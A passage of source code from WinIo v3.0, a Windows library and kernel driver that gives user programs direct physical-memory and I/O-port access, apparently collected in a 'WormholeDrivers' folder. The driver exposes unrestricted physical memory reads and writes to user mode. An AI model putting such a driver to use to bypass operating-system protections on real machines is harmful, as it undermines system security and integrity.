	}

	return (PBYTE)PhysStruct.pvPhysMemLin;
}


bool _stdcall UnmapPhysicalMemory(tagPhysStruct &PhysStruct)
{
	DWORD dwBytesReturned;

	if (!IsWinIoInitialized)
	{
		return false;
	}

	if (!DeviceIoControl(hDriver, IOCTL_WINIO_UNMAPPHYSADDR, &PhysStruct,
		sizeof(tagPhysStruct), NULL, 0, &dwBytesReturned, NULL))
	{
		return false;
	}

	return true;
}

// Support functions

bool _stdcall GetPhysLong(PBYTE pbPhysAddr, PDWORD pdwPhysVal)
{
	PDWORD pdwLinAddr;
	tagPhysStruct PhysStruct;

	if (!IsWinIoInitialized)
		return false;

	if (g_Is64BitOS)
	{
		PhysStruct.pvPhysAddress = (DWORD64)pbPhysAddr;
	}
	else
	{
		// Avoid sign extension issues
		PhysStruct.pvPhysAddress = (DWORD64)(DWORD32)pbPhysAddr;
	}

	PhysStruct.dwPhysMemSizeInBytes = 4;

	pdwLinAddr = (PDWORD)MapPhysToLin(PhysStruct);

	if (pdwLinAddr == NULL)
		return false;

	*pdwPhysVal = *pdwLinAddr;

	UnmapPhysicalMemory(PhysStruct);

	return true;
}


bool _stdcall SetPhysLong(PBYTE pbPhysAddr, DWORD dwPhysVal)
{
	PDWORD pdwLinAddr;
	tagPhysStruct PhysStruct;

	if (!IsWinIoInitialized)
		return false;

	if (g_Is64BitOS)
	{
		PhysStruct.pvPhysAddress = (DWORD64)pbPhysAddr;
	}
	else
	{
		// Avoid sign extension issues
		PhysStruct.pvPhysAddress = (DWORD64)(DWORD32)pbPhysAddr;
	}

	PhysStruct.dwPhysMemSizeInBytes = 4;

	pdwLinAddr = (PDWORD)MapPhysToLin(PhysStruct);

	if (pdwLinAddr == NULL)
		return false;

	*pdwLinAddr = dwPhysVal;

	UnmapPhysicalMemory(PhysStruct);

	return true;
}

```

`source/WormholeDrivers/WINIO/Source/Dll/Phys32.h`:

```h
#ifndef PHYS32_H
#define PHYS32_H

extern DWORD (WINAPI *VxDCall)(DWORD Service, DWORD EAX_Reg, DWORD ECX_Reg);

#endif
```

`source/WormholeDrivers/WINIO/Source/Dll/Port32.cpp`:

```cpp
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//				 Direct Hardware Access Under Windows	//
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

#include <windows.h>
#include <winioctl.h>
#include <conio.h>
#include "port32.h"
#include "..\drv\winio_nt.h"
#include "winio.h"


bool _stdcall GetPortVal(WORD wPortAddr, PDWORD pdwPortVal, BYTE bSize)
{
	if (!IsWinIoInitialized)
	{
		return false;
	}

#ifdef _WIN64
	tagPortStruct PortStruct;
	DWORD dwBytesReturned;

	PortStruct.bSize = bSize;
	PortStruct.wPortAddr = wPortAddr;

	return DeviceIoControl(hDriver, IOCTL_WINIO_READPORT, &PortStruct, sizeof(PortStruct),
		pdwPortVal, sizeof(DWORD), &dwBytesReturned, NULL);


#elif _WIN32
	// If this is a 64 bit OS, we must use the driver to access I/O ports even if the application is 32 bit
	if (g_Is64BitOS)
	{
		tagPortStruct PortStruct;
		DWORD dwBytesReturned;

		PortStruct.bSize = bSize;
		PortStruct.wPortAddr = wPortAddr;

		return DeviceIoControl(hDriver, IOCTL_WINIO_READPORT, &PortStruct, sizeof(PortStruct),
			pdwPortVal, sizeof(DWORD), &dwBytesReturned, NULL);
	}
	else
	{
		switch (bSize)
		{
		case 1:

			*pdwPortVal = _inp(wPortAddr);

			break;

		case 2:

			*pdwPortVal = _inpw(wPortAddr);

			break;

		case 4:

			*pdwPortVal = _inpd(wPortAddr);

			break;
		}
	}
#endif

	return true;
}


bool _stdcall SetPortVal(WORD wPortAddr, DWORD dwPortVal, BYTE bSize)
{
	if (!IsWinIoInitialized)
	{
		return false;
	}

#ifdef _WIN64
	tagPortStruct PortStruct;
	DWORD dwBytesReturned;

	PortStruct.bSize = bSize;
	PortStruct.dwPortVal = dwPortVal;
	PortStruct.wPortAddr = wPortAddr;

	return DeviceIoControl(hDriver, IOCTL_WINIO_WRITEPORT, &PortStruct, sizeof(PortStruct),
		NULL, 0, &dwBytesReturned, NULL);
#elif _WIN32
	// If this is a 64 bit OS, we must use the driver to access I/O ports even if the application is 32 bit
	if (g_Is64BitOS)
	{
		tagPortStruct PortStruct;
		DWORD dwBytesReturned;

		PortStruct.bSize = bSize;
		PortStruct.dwPortVal = dwPortVal;
		PortStruct.wPortAddr = wPortAddr;

		return DeviceIoControl(hDriver, IOCTL_WINIO_WRITEPORT, &PortStruct, sizeof(PortStruct),
			NULL, 0, &dwBytesReturned, NULL);
	}
	else
	{
		switch (bSize)
		{
		case 1:

			_outp(wPortAddr, dwPortVal);

			break;

		case 2:

			_outpw(wPortAddr, (WORD)dwPortVal);

			break;

		case 4:

			_outpd(wPortAddr, dwPortVal);

			break;
		}
	}
#endif

	return true;
}

```

`source/WormholeDrivers/WINIO/Source/Dll/Port32.h`:

```h
#ifndef PORT32_H
#define PORT32_H

#pragma pack(1)

struct GDT_DESCRIPTOR
{
  WORD Limit_0_15;
  WORD Base_0_15;
  BYTE Base_16_23;
  BYTE Type         : 4;
  BYTE System       : 1;
  BYTE DPL          : 2;
  BYTE Present      : 1;
  BYTE Limit_16_19  : 4;
  BYTE Available    : 1;
  BYTE Reserved     : 1;
  BYTE D_B          : 1;
  BYTE Granularity  : 1;
  BYTE Base_24_31;
};

struct CALLGATE_DESCRIPTOR
{
  WORD Offset_0_15;
  WORD Selector;
  WORD ParamCount   : 5;
  WORD Unused       : 3;
  WORD Type         : 4;
  WORD System       : 1;
  WORD DPL          : 2;
  WORD Present      : 1;
  WORD Offset_16_31;
};

struct GDTR
{
  WORD wGDTLimit;
  DWORD dwGDTBase;
};

#pragma pack()

#endif
```

`source/WormholeDrivers/WINIO/Source/Dll/WinIo.cpp`:

```cpp
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//				 Direct Hardware Access Under Windows	//
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winioctl.h>
#include "phys32.h"
#include "..\drv\winio_nt.h"
#include "winio.h"

HANDLE hDriver = INVALID_HANDLE_VALUE;
bool IsWinIoInitialized = false;
wchar_t szWinIoDriverPath[32768];
bool g_Is64BitOS;


typedef UINT (WINAPI* GETSYSTEMWOW64DIRECTORY)(LPTSTR, UINT);

BOOL Is64BitOS()
{
#ifdef _WIN64
	return TRUE;
#else
	GETSYSTEMWOW64DIRECTORY getSystemWow64Directory;
	HMODULE hKernel32;
	TCHAR Wow64Directory[32767];

	hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
	if (hKernel32 == NULL)
	{
		//
		// This shouldn't happen, but if we can't get 
		// kernel32's module handle then assume we are 
		// on x86. We won't ever install 32-bit drivers
		// on 64-bit machines, we just want to catch it 
		// up front to give users a better error message.
		//
		return FALSE;
	}

	getSystemWow64Directory = (GETSYSTEMWOW64DIRECTORY)GetProcAddress(hKernel32, "GetSystemWow64DirectoryW");

	if (getSystemWow64Directory == NULL)
	{
		//
		// This most likely means we are running 
		// on Windows 2000, which didn't have this API 
		// and didn't have a 64-bit counterpart.
		//
		return FALSE;
	}

	if ((getSystemWow64Directory(Wow64Directory, _countof(Wow64Directory)) == 0) &&
		(GetLastError() == ERROR_CALL_NOT_IMPLEMENTED)) {
			return FALSE;
	}

	//
	// GetSystemWow64Directory succeeded 
	// so we are on a 64-bit OS.
	//
	return TRUE;
#endif
}


bool GetDriverPath()
{
	PWSTR pszSlash;

	if (!GetModuleFileName(GetModuleHandle(NULL), szWinIoDriverPath, sizeof(szWinIoDriverPath)))
		return false;

	pszSlash = wcsrchr(szWinIoDriverPath, '\\');

	if (pszSlash)
		pszSlash[1] = 0;
	else
		return false;

	if (g_Is64BitOS)
		wcscat(szWinIoDriverPath, L"winio64.sys");
	else
		wcscat(szWinIoDriverPath, L"winio32.sys");

	return true;
}


bool __stdcall InitializeWinIo()
{
	bool bResult;
	DWORD dwBytesReturned;

	g_Is64BitOS = Is64BitOS();

	hDriver = CreateFile(L"\\\\.\\WINIO",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	// If the driver is not running, install it

	if (hDriver == INVALID_HANDLE_VALUE)
	{		
		GetDriverPath();

		bResult = InstallWinIoDriver(szWinIoDriverPath, true);

		if (!bResult)
			return false;

		bResult = StartWinIoDriver();

		if (!bResult)
			return false;

		hDriver = CreateFile(L"\\\\.\\WINIO",
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (hDriver == INVALID_HANDLE_VALUE)
			return false;
	}

	// Enable I/O port access for this process if running on a 32 bit OS

	if (!g_Is64BitOS)
	{
		if (!DeviceIoControl(hDriver, IOCTL_WINIO_ENABLEDIRECTIO, NULL,
			0, NULL, 0, &dwBytesReturned, NULL))
		{
			return false;
		}
	}

	IsWinIoInitialized = true;

	return true;
}


void _stdcall ShutdownWinIo()
{
	DWORD dwBytesReturned;

	if (hDriver != INVALID_HANDLE_VALUE)
	{
		// Disable I/O port access if running on a 32 bit OS

		if (!g_Is64BitOS)
		{
			DeviceIoControl(hDriver, IOCTL_WINIO_DISABLEDIRECTIO, NULL,
				0, NULL, 0, &dwBytesReturned, NULL);
		}

		CloseHandle(hDriver);

	}

	RemoveWinIoDriver();

	IsWinIoInitialized = false;
}

```

`source/WormholeDrivers/WINIO/Source/Dll/WinIo.def`:

```def
EXPORTS
InitializeWinIo
ShutdownWinIo
MapPhysToLin
UnmapPhysicalMemory
GetPhysLong
SetPhysLong
GetPortVal
SetPortVal
InstallWinIoDriver
RemoveWinIoDriver

```

`source/WormholeDrivers/WINIO/Source/Dll/WinIo.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "afxres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (U.S.) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
#ifdef _WIN32
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)
#endif //_WIN32

/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 3,0,0,0
 PRODUCTVERSION 3,0,0,0
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x29L
#else
 FILEFLAGS 0x28L
#endif
 FILEOS 0x40004L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "Comments", " "
            VALUE "CompanyName", "www.internals.com"
            VALUE "FileDescription", "WinIo"
            VALUE "FileVersion", "3.0"
            VALUE "InternalName", "WinIo"
            VALUE "LegalCopyright", "Copyright © 1998-2010, Yariv Kaplan"
            VALUE "LegalTrademarks", " "
            VALUE "OriginalFilename", "WinIo.dll"
            VALUE "PrivateBuild", " "
            VALUE "ProductName", "WinIo"
            VALUE "ProductVersion", "3.0"
            VALUE "SpecialBuild", " "
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END


#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""afxres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED

#endif    // English (U.S.) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`source/WormholeDrivers/WINIO/Source/Dll/WinIo.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 10.00
# Visual Studio 2008
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "WinIo", "WinIo.vcproj", "{DE9A75D4-D640-41B8-893B-A384FAF00738}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Win32 = Debug|Win32
		Debug|x64 = Debug|x64
		Release|Win32 = Release|Win32
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Debug|Win32.ActiveCfg = Debug|Win32
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Debug|Win32.Build.0 = Debug|Win32
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Debug|x64.ActiveCfg = Debug|x64
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Debug|x64.Build.0 = Debug|x64
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Release|Win32.ActiveCfg = Release|Win32
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Release|Win32.Build.0 = Release|Win32
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Release|x64.ActiveCfg = Release|x64
		{DE9A75D4-D640-41B8-893B-A384FAF00738}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`source/WormholeDrivers/WINIO/Source/Dll/WinIo.vcproj`:

```vcproj
<?xml version="1.0" encoding="Windows-1252"?>
<VisualStudioProject
	ProjectType="Visual C++"
	Version="9.00"
	Name="WinIo"
	ProjectGUID="{DE9A75D4-D640-41B8-893B-A384FAF00738}"
	RootNamespace="WinIo"
	Keyword="Win32Proj"
	TargetFrameworkVersion="131072"
	>
	<Platforms>
		<Platform
			Name="Win32"
		/>
		<Platform
			Name="x64"
		/>
	</Platforms>
	<ToolFiles>
	</ToolFiles>
	<Configurations>
		<Configuration
			Name="Debug|Win32"
			OutputDirectory="$(SolutionDir)x86\$(ConfigurationName)"
			IntermediateDirectory="x86\$(ConfigurationName)"
			ConfigurationType="2"
			CharacterSet="1"
			BuildLogFile="$(IntDir)\BuildLog.htm"
			>
			<Tool
				Name="VCPreBuildEventTool"
			/>
			<Tool
				Name="VCCustomBuildTool"
			/>
			<Tool
				Name="VCXMLDataGeneratorTool"
			/>
			<Tool
				Name="VCWebServiceProxyGeneratorTool"
			/>
			<Tool
				Name="VCMIDLTool"
			/>
			<Tool
				Name="VCCLCompilerTool"
				Optimization="0"
				PreprocessorDefinitions="WINIO_DLL"
				MinimalRebuild="true"
				BasicRuntimeChecks="3"
				RuntimeLibrary="1"
				UsePrecompiledHeader="0"
				WarningLevel="3"
				Detect64BitPortabilityProblems="true"
				DebugInformationFormat="4"
			/>
			<Tool
				Name="VCManagedResourceCompilerTool"
			/>
			<Tool
				Name="VCResourceCompilerTool"
			/>
			<Tool
				Name="VCPreLinkEventTool"
			/>
			<Tool
				Name="VCLinkerTool"
				OutputFile="$(OutDir)\$(ProjectName)32.dll"
				LinkIncremental="2"
				ModuleDefinitionFile=".\WinIo.def"
				GenerateDebugInformation="true"
				SubSystem="2"
				RandomizedBaseAddress="1"
				DataExecutionPrevention="0"
				TargetMachine="1"
			/>
			<Tool
				Name="VCALinkTool"
			/>
			<Tool
				Name="VCManifestTool"
			/>
			<Tool
				Name="VCXDCMakeTool"
			/>
			<Tool
				Name="VCBscMakeTool"
			/>
			<Tool
				Name="VCFxCopTool"
			/>
			<Tool
				Name="VCAppVerifierTool"
			/>
			<Tool
				Name="VCPostBuildEventTool"
			/>
		</Configuration>
		<Configuration
			Name="Debug|x64"
			OutputDirectory="$(SolutionDir)$(PlatformName)\$(ConfigurationName)"
			IntermediateDirectory="$(PlatformName)\$(ConfigurationName)"
			ConfigurationType="2"
			CharacterSet="1"
			>
			<Tool
				Name="VCPreBuildEventTool"
			/>
			<Tool
				Name="VCCustomBuildTool"
			/>
			<Tool
				Name="VCXMLDataGeneratorTool"
			/>
			<Tool
				Name="VCWebServiceProxyGeneratorTool"
			/>
			<Tool
				Name="VCMIDLTool"
				TargetEnvironment="3"
			/>
			<Tool
				Name="VCCLCompilerTool"
				Optimization="0"
				PreprocessorDefinitions="WINIO_DLL"
				MinimalRebuild="true"
				BasicRuntimeChecks="3"
				RuntimeLibrary="1"
				UsePrecompiledHeader="0"
				WarningLevel="3"
				Detect64BitPortabilityProblems="true"
				DebugInformationFormat="3"
			/>
			<Tool
				Name="VCManagedResourceCompilerTool"
			/>
			<Tool
				Name="VCResourceCompilerTool"
			/>
			<Tool
				Name="VCPreLinkEventTool"
			/>
			<Tool
				Name="VCLinkerTool"
				OutputFile="$(OutDir)\$(ProjectName)64.dll"
				LinkIncremental="2"
				ModuleDefinitionFile=".\WinIo.def"
				GenerateDebugInformation="true"
				SubSystem="2"
				RandomizedBaseAddress="1"
				DataExecutionPrevention="0"
				TargetMachine="17"
			/>
			<Tool
				Name="VCALinkTool"
			/>
			<Tool
				Name="VCManifestTool"
			/>
			<Tool
				Name="VCXDCMakeTool"
			/>
			<Tool
				Name="VCBscMakeTool"
			/>
			<Tool
				Name="VCFxCopTool"
			/>
			<Tool
				Name="VCAppVerifierTool"
			/>
			<Tool
				Name="VCPostBuildEventTool"
			/>
		</Configuration>
		<Configuration
			Name="Release|Win32"
			OutputDirectory="$(SolutionDir)x86\$(ConfigurationName)"
			IntermediateDirectory="x86\$(ConfigurationName)"
			ConfigurationType="2"
			CharacterSet="1"
			WholeProgramOptimization="1"
			BuildLogFile="$(IntDir)\BuildLog.htm"
			>
			<Tool
				Name="VCPreBuildEventTool"
			/>
			<Tool
				Name="VCCustomBuildTool"
			/>
			<Tool
				Name="VCXMLDataGeneratorTool"
			/>
			<Tool
				Name="VCWebServiceProxyGeneratorTool"
			/>
			<Tool
				Name="VCMIDLTool"
			/>
			<Tool
				Name="VCCLCompilerTool"
				PreprocessorDefinitions="WINIO_DLL"
				RuntimeLibrary="0"
				UsePrecompiledHeader="0"
				WarningLevel="3"
				Detect64BitPortabilityProblems="true"
				DebugInformationFormat="3"
			/>
			<Tool
				Name="VCManagedResourceCompilerTool"
			/>
			<Tool
				Name="VCResourceCompilerTool"
			/>
			<Tool
				Name="VCPreLinkEventTool"
			/>
			<Tool
				Name="VCLinkerTool"
				OutputFile="$(OutDir)\$(ProjectName)32.dll"
				LinkIncremental="1"
				ModuleDefinitionFile=".\WinIo.def"
				GenerateDebugInformation="true"
				SubSystem="2"
				OptimizeReferences="2"
				EnableCOMDATFolding="2"
				RandomizedBaseAddress="1"
				DataExecutionPrevention="0"
				TargetMachine="1"
			/>
			<Tool
				Name="VCALinkTool"
			/>
			<Tool
				Name="VCManifestTool"
			/>
			<Tool
				Name="VCXDCMakeTool"
			/>
			<Tool
				Name="VCBscMakeTool"
			/>
			<Tool
				Name="VCFxCopTool"
			/>
			<Tool
				Name="VCAppVerifierTool"
			/>
			<Tool
				Name="VCPostBuildEventTool"
			/>
		</Configuration>
		<Configuration
			Name="Release|x64"
			OutputDirectory="$(SolutionDir)$(PlatformName)\$(ConfigurationName)"
			IntermediateDirectory="$(PlatformName)\$(ConfigurationName)"
			ConfigurationType="2"
			CharacterSet="1"
			WholeProgramOptimization="1"
			>
			<Tool
				Name="VCPreBuildEventTool"
			/>
			<Tool
				Name="VCCustomBuildTool"
			/>
			<Tool
				Name="VCXMLDataGeneratorTool"
			/>
			<Tool
				Name="VCWebServiceProxyGeneratorTool"
			/>
			<Tool
				Name="VCMIDLTool"
				TargetEnvironment="3"
			/>
			<Tool
				Name="VCCLCompilerTool"
				PreprocessorDefinitions="WINIO_DLL"
				RuntimeLibrary="0"
				UsePrecompiledHeader="0"
				WarningLevel="3"
				Detect64BitPortabilityProblems="true"
				DebugInformationFormat="3"
			/>
			<Tool
				Name="VCManagedResourceCompilerTool"
			/>
			<Tool
				Name="VCResourceCompilerTool"
			/>
			<Tool
				Name="VCPreLinkEventTool"
			/>
			<Tool
				Name="VCLinkerTool"
				OutputFile="$(OutDir)\$(ProjectName)64.dll"
				LinkIncremental="1"
				ModuleDefinitionFile=".\WinIo.def"
				GenerateDebugInformation="true"
				SubSystem="2"
				OptimizeReferences="2"
				EnableCOMDATFolding="2"
				RandomizedBaseAddress="1"
				DataExecutionPrevention="0"
				TargetMachine="17"
			/>
			<Tool
				Name="VCALinkTool"
			/>
			<Tool
				Name="VCManifestTool"
			/>
			<Tool
				Name="VCXDCMakeTool"
			/>
			<Tool
				Name="VCBscMakeTool"
			/>
			<Tool
				Name="VCFxCopTool"
			/>
			<Tool
				Name="VCAppVerifierTool"
			/>
			<Tool
				Name="VCPostBuildEventTool"
			/>
		</Configuration>
	</Configurations>
	<References>
	</References>
	<Files>
		<Filter
			Name="Source Files"
			Filter="cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx"
			UniqueIdentifier="{4FC737F1-C7A5-4376-A066-2A32D752A2FF}"
			>
			<File
				RelativePath=".\InstDrv.cpp"
				>
			</File>
			<File
				RelativePath=".\Phys32.cpp"
				>
			</File>
			<File
				RelativePath=".\Port32.cpp"
				>
			</File>
			<File
				RelativePath=".\WinIo.cpp"
				>
			</File>
			<File
				RelativePath=".\WinIo.def"
				>
			</File>
			<File
				RelativePath=".\WinIo.rc"
				>
			</File>
		</Filter>
		<Filter
			Name="Header Files"
			Filter="h;hpp;hxx;hm;inl;inc;xsd"
			UniqueIdentifier="{93995380-89BD-4b04-88EB-625FBE52EBFB}"
			>
		</Filter>
		<Filter
			Name="Resource Files"
			Filter="rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav"
			UniqueIdentifier="{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}"
			>
		</Filter>
	</Files>
	<Globals>
	</Globals>
</VisualStudioProject>

```

`source/WormholeDrivers/WINIO/Source/Dll/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Developer Studio generated include file.
// Used by WinIo.rc
//

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1000
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`source/WormholeDrivers/WINIO/Source/Dll/winio.h`:

```h
#ifndef WINIO_H
#define WINIO_H

#include "..\drv\winio_nt.h"

#ifndef WINIO_DLL
#define WINIO_API _declspec(dllimport)
#else
#define WINIO_API 
#endif

extern "C"
{
  WINIO_API bool _stdcall InitializeWinIo();
  WINIO_API void _stdcall ShutdownWinIo();
  WINIO_API PBYTE _stdcall MapPhysToLin(tagPhysStruct &PhysStruct);
  WINIO_API bool _stdcall UnmapPhysicalMemory(tagPhysStruct &PhysStruct);
  WINIO_API bool _stdcall GetPhysLong(PBYTE pbPhysAddr, PDWORD pdwPhysVal);
  WINIO_API bool _stdcall SetPhysLong(PBYTE pbPhysAddr, DWORD dwPhysVal);
  WINIO_API bool _stdcall GetPortVal(WORD wPortAddr, PDWORD pdwPortVal, BYTE bSize);
  WINIO_API bool _stdcall SetPortVal(WORD wPortAddr, DWORD dwPortVal, BYTE bSize);
  WINIO_API bool _stdcall InstallWinIoDriver(PWSTR pszWinIoDriverPath, bool IsDemandLoaded = false);
  WINIO_API bool _stdcall RemoveWinIoDriver();
}

extern HANDLE hDriver;
extern bool IsWinIoInitialized;
extern bool g_Is64BitOS;

bool _stdcall StartWinIoDriver();
bool _stdcall StopWinIoDriver();

#endif

```

`source/WormholeDrivers/WINIO/Source/Drv/MAKEFILE`:

```
#
# DO NOT EDIT THIS FILE!!!  Edit .\sources. if you want to add a new source
# file to this component.  This file merely indirects to the real make file
# that is shared by all the driver components of the Windows NT DDK
#

!INCLUDE $(NTMAKEENV)\makefile.def

```

`source/WormholeDrivers/WINIO/Source/Drv/SOURCES`:

```
TARGETNAME=WinIo
TARGETPATH=.
TARGETTYPE=DRIVER
NTDEBUG=ntsd

SOURCES= winio.c

```

`source/WormholeDrivers/WINIO/Source/Drv/WinIo.c`:

```c
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//					Direct Hardware Access for Windows	//
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

#include <ntddk.h>
#include "winio_nt.h"

#define IOPM_SIZE 0x2000
typedef char IOPM[IOPM_SIZE];

// Function definition section
// -----------------------------------------------------------------
NTSTATUS WinIoDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
void WinIoUnload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS UnmapPhysicalMemory(HANDLE PhysicalMemoryHandle, PVOID pPhysMemLin, PVOID PhysSection);
NTSTATUS MapPhysicalMemoryToLinearSpace(PVOID pPhysAddress,
										SIZE_T PhysMemSizeInBytes,
										PVOID *ppPhysMemLin,
										HANDLE *pPhysicalMemoryHandle,
										PVOID *ppPhysSection);

#ifndef AMD64
void Ke386SetIoAccessMap(int, IOPM *);
void Ke386QueryIoAccessMap(int, IOPM *);
void Ke386IoSetAccessProcess(PEPROCESS, int);
#endif

// -----------------------------------------------------------------

// Installable driver initialization entry point.
// This entry point is called directly by the I/O system.

NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,
					  IN PUNICODE_STRING RegistryPath)
{
	UNICODE_STRING  DeviceNameUnicodeString;
	UNICODE_STRING  DeviceLinkUnicodeString;
	NTSTATUS        ntStatus;
	PDEVICE_OBJECT  DeviceObject = NULL;

	KdPrint(("Entering DriverEntry"));

	RtlInitUnicodeString (&DeviceNameUnicodeString, L"\\Device\\WinIo");

	// Create a device object 

	ntStatus = IoCreateDevice (DriverObject,
		0,
		&DeviceNameUnicodeString,
		FILE_DEVICE_WINIO,
		0,
		FALSE,
		&DeviceObject);

	if (NT_SUCCESS(ntStatus))
	{
		// Create dispatch points for device control, create, close.

		DriverObject->MajorFunction[IRP_MJ_CREATE]		   =
		DriverObject->MajorFunction[IRP_MJ_CLOSE]		   =
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = WinIoDispatch;
		DriverObject->DriverUnload                         = WinIoUnload;

		// Create a symbolic link, e.g. a name that a Win32 app can specify
		// to open the device.

		RtlInitUnicodeString (&DeviceLinkUnicodeString, L"\\DosDevices\\WinIo");

		ntStatus = IoCreateSymbolicLink (&DeviceLinkUnicodeString,
			&DeviceNameUnicodeString);

		if (!NT_SUCCESS(ntStatus))
		{
			// Symbolic link creation failed- note this & then delete the
			// device object (it's useless if a Win32 app can't get at it).

			KdPrint(("ERROR: IoCreateSymbolicLink failed"));

			IoDeleteDevice (DeviceObject);
		}

	}
	else
	{
		KdPrint(("ERROR: IoCreateDevice failed"));
	}

	KdPrint(("Leaving DriverEntry"));

	return ntStatus;
}


// Process the IRPs sent to this device

NTSTATUS WinIoDispatch(IN PDEVICE_OBJECT DeviceObject,
					   IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack;
	ULONG              dwInputBufferLength;
	ULONG              dwOutputBufferLength;
	ULONG              dwIoControlCode;
	PVOID              pvIOBuffer;
	NTSTATUS           ntStatus;
	IOPM*			   pIOPM = NULL;
	struct             tagPhysStruct PhysStruct;
	struct             tagPortStruct PortStruct;
	struct             tagPhysStruct32 *pPhysStruct32 = NULL;

	KdPrint(("Entering WinIoDispatch"));

	// Init to default settings

	Irp->IoStatus.Status      = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IrpStack = IoGetCurrentIrpStackLocation(Irp);

	// Get the pointer to the input/output buffer and it's length

	pvIOBuffer           = Irp->AssociatedIrp.SystemBuffer;
	dwInputBufferLength  = IrpStack->Parameters.DeviceIoControl.InputBufferLength;
	dwOutputBufferLength = IrpStack->Parameters.DeviceIoControl.OutputBufferLength;

	switch (IrpStack->MajorFunction)
	{
	case IRP_MJ_CREATE:

		KdPrint(("IRP_MJ_CREATE"));

		break;

	case IRP_MJ_CLOSE:

		KdPrint(("IRP_MJ_CLOSE"));

		break;

	case IRP_MJ_DEVICE_CONTROL:

		KdPrint(("IRP_MJ_DEVICE_CONTROL"));

		dwIoControlCode = IrpStack->Parameters.DeviceIoControl.IoControlCode;

		switch (dwIoControlCode)
		{
			// The Ke386 calls are no longer available on x64 Windows

#ifndef AMD64
	case IOCTL_WINIO_ENABLEDIRECTIO:

		KdPrint(("IOCTL_WINIO_ENABLEDIRECTIO"));

		pIOPM = MmAllocateNonCachedMemory(sizeof(IOPM));

		if (pIOPM)
		{
			RtlZeroMemory(pIOPM, sizeof(IOPM));

			Ke386IoSetAccessProcess(PsGetCurrentProcess(), 1);
			Ke386SetIoAccessMap(1, pIOPM);
			IrpStack->FileObject->FsContext2 = pIOPM;
		}
		else
			Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;

		break;

	case IOCTL_WINIO_DISABLEDIRECTIO:

		KdPrint(("IOCTL_WINIO_DISABLEDIRECTIO"));

		pIOPM = (IOPM *)IrpStack->FileObject->FsContext2;

		if (pIOPM)
		{
			Ke386IoSetAccessProcess(PsGetCurrentProcess(), 0);
			Ke386SetIoAccessMap(1, pIOPM);
			MmFreeNonCachedMemory(pIOPM, sizeof(IOPM));
		}

		break;
#endif

